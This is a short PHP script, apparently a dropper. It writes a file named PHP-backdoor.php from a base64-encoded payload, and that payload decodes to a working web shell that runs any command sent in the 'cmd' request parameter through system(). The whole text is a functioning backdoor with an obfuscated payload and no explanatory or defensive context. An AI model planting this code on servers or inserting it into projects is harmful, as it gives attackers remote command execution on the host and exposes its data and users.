<?php
    $file = fopen("PHP-backdoor.php","w"); echo fwrite($file,base64_decode('PD9waHAKaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICAgICAgICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7CiAgICAgICAgc3lzdGVtKCRjbWQpOwogICAgICAgIGRpZTsKfQo/Pg==')), fclose($file);
?>
